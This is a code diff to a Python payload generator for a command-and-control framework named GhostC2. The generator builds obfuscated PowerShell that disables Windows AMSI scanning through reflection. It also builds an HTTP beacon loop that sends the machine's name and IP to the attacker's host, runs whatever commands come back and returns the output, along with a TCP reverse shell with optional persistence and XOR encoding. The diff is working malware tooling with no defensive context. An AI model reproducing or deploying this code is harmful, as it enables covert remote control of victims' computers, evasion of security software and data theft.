@@ -26,7 +26,7 @@ def get_amsi_bypass(method="redundant"):
 try{[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)}catch{}
 try{$w=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');$f=$w.GetField('amsiInitFailed','NonPublic,Static');$f.SetValue($null,$true)}catch{}
 """
-    else:  # advanced (currently same as redundant for stability)
+    else:
         return """
 try{[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField(('amsi'+'Init'+'Failed'),'NonPublic,Static').SetValue($null,$true)}catch{}
 """
@@ -56,44 +56,27 @@ function XOR($data,$key=0x5A){
     return [System.Text.Encoding]::ASCII.GetString($b);
 }
 """
+
 def get_http_tasker(host, port=8080):
     return f"""
-# Establish TCP connection in main scope
-$client = New-Object System.Net.Sockets.TCPClient("{host}",1443)
-$stream = $client.GetStream()
+while ($true) {{
+    try {{
+        $hostname = $env:COMPUTERNAME
+        $ip = (Invoke-RestMethod -Uri "http://ifconfig.me")
+        $payload = "ps_reverse"
 
-# Pass it into the job via param
-Start-Job -ScriptBlock {{
-    param($stream, $host, $port)
-    while ($true) {{
-        try {{
-            $hostname = $env:COMPUTERNAME
-            $payload = "ps_reverse"
+        $resp = Invoke-RestMethod -Uri "http://{host}:{port}/beacon" -Method Post -Body @{{hostname=$hostname;ip=$ip;payload=$payload}} | ConvertTo-Json -Depth 3
+        $tasks = ($resp | ConvertFrom-Json).tasks
 
-            $resp = Invoke-RestMethod -Uri "http://$host:$port/beacon" -Method Post -Body @{{hostname=$hostname;ip='agent';payload=$payload}} | ConvertTo-Json -Depth 3
-            $tasks = ($resp | ConvertFrom-Json).tasks
-
-            foreach ($cmd in $tasks) {{
-                $out = Invoke-Expression $cmd | Out-String
-
-                # Write to reverse shell
-                try {{
-                    $send = "[GhostC2] $cmd`n$out`n"
-                    $bytes = [System.Text.Encoding]::ASCII.GetBytes($send)
-                    $stream.Write($bytes, 0, $bytes.Length)
-                    $stream.Flush()
-                }} catch {{}}
-
-                # Send result back to GhostC2
-                $body = @{{hostname=$hostname;command=$cmd;result=$out;payload=$payload}} | ConvertTo-Json -Depth 3
-                Invoke-RestMethod -Uri "http://$host:$port/result" -Method Post -Body $body -ContentType "application/json"
-            }}
-        }} catch {{}}
-        Start-Sleep -Seconds 10
-    }}
-}} -ArgumentList $stream, "{host}", {port} | Out-Null
+        foreach ($cmd in $tasks) {{
+            $out = Invoke-Expression $cmd | Out-String
+            $body = @{{hostname=$hostname;command=$cmd;result=$out;payload=$payload}} | ConvertTo-Json -Depth 3
+            Invoke-RestMethod -Uri "http://{host}:{port}/result" -Method Post -Body $body -ContentType "application/json"
+        }}
+    }} catch {{ Write-Host "[!] Error in loop: $_" }}
+    Start-Sleep -Seconds 10
+}}
 """
-
 
 def generate_obfuscated_ps(
     host="localhost",
@@ -103,29 +86,18 @@ def generate_obfuscated_ps(
     auto_recon=False,
     xor_encrypt=False,
     write_file=True,
-    http_tasker=False,  # ⬅️ new flag
+    http_tasker=False,
     http_port=8080
 ):
     parts = []
-
-    # AMSI bypass
     parts.append(get_amsi_bypass(amsi_bypass))
-
     if http_tasker:
         parts.append(get_http_tasker(host, http_port))
-
-    # Persistence (optional)
     if persistence != "none":
         parts.append(get_persistence(persistence, host, port))
-
-    # XOR function (optional)
     if xor_encrypt:
         parts.append(xor_wrapper())
-
-    # Recon (optional)
     recon_cmd = get_recon_commands() if auto_recon else ""
-
-    # Core shell (proven good!)
     core_shell = f"""
 $client = New-Object System.Net.Sockets.TCPClient('{host}',{port});
 $stream = $client.GetStream();
@@ -144,15 +116,10 @@ while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){{
     $stream.Flush();
 }}
 """
-
-    # Add optional recon
     if recon_cmd:
         core_shell = recon_cmd + core_shell
-
     parts.append(core_shell)
-
     payload_final = "\n".join(parts)
-
     if write_file:
         folder = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'server', 'payloads'))
         os.makedirs(folder, exist_ok=True)
@@ -164,5 +131,4 @@ while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){{
     else:
         return payload_final
 
-# Alias (preserve existing calls)
 generate_polymorphic_ps = generate_obfuscated_ps
